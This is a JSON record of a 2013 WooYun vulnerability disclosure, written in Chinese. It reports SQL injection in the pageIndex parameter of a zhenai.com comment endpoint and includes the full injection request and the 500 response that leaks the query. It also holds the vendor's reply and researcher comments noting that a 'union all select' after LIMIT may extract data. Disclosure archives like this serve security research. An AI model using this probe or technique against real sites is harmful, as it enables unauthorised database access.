{"id": 7360, "wybug_id": "wooyun-2013-042009", "wybug_title": "珍爱网某分站奇葩注入(http头)", "wybug_corp": "珍爱网", "wybug_author": "想要减肥的胖纸", "wybug_date": "2013-11-05 08:27", "wybug_open_date": "2013-12-20 08:28", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-20：\t细节向公众公开  简要描述： 太奇葩了。 详细说明：  未对参数进行过滤带入数据库查询了。奇葩的是返回结果竟然在http头里。如果基于页面返回检查注入估计就会pass了。。pageIndex 存在注入。http://t.zhenai.com/common/getComments.do?callback=jQuery18309714489171747118_1383582025205&comment.moduleType=0&comment.specialType=94&pageIndex=1'   漏洞证明：  \nGET http://t.zhenai.com/common/getComments.do?callback=jQuery18309714489171747118_1383582025205&comment.moduleType=0&comment.specialType=94&pageIndex=1'-- HTTP/1.1Referer: http://t.zhenai.com/Cookie: JSESSIONID=abctHORWBFeDjavUBwIiuHost: t.zhenai.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*\n响应\nHTTP/1.1 500 PreparedStatementCallback; bad SQL grammar [select id,specialType,moduleType,memberId,comments,replayMemberId,supportCount,opposeCount,commentCount,createTime,top from topic_comment.Comments_94 where specialType=? and moduleType=? and parentId=? and state=1 order by top desc,commentCount desc,createTime desc limit ?,?]; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-5,5' at line 1Server: nginxDate: Mon, 04 Nov 2013 17:36:22 GMTContent-Type: text/html; charset=GBKTransfer-Encoding: chunkedConnection: keep-aliveContent-Language: zh-CN\n   修复方案：     版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-11-05 10:03 厂商回复： 不算是漏洞，仅仅是struts没有设置错误流向，已经修改配置，安全无小事，谢谢肥纸。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-05 08:40 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  讲出来就不奇葩了    \n     2013-11-05 09:37 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  奇葩的要关注涨点见识    \n     2013-11-05 09:38 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  上次看到xforward注入和clientip注入。看的我嗷嗷叫    \n     2013-11-05 10:16 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  奇葩的要关注涨点见识    \n     2013-11-05 12:22 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这个厂商是不太懂安全啊 你给个错误的 不给出数据它就说这个是个错误显示的问题    \n     2013-11-05 15:22 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @xsser zone里有我一个帖子 对于这种厂商以后我不会把问题地址给他们，让他们自己查去。    \n     2013-11-05 15:24 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @xsser 看厂商回复估计他们没从代码层面修补，只是屏蔽回显和依靠安全设备。    \n     2013-11-25 15:39 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @想要减肥的胖纸 求limit可控 怎么搞到数据？    \n     2013-11-25 15:46 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @齐迹 没研究~ 我是菜鸟。    \n     2013-11-25 18:10 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @想要减肥的胖纸 摆渡了一下。limit后面也可以 union all select  看来这里注入的可能性还是很大的！确实屏蔽错误解决不了问题。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}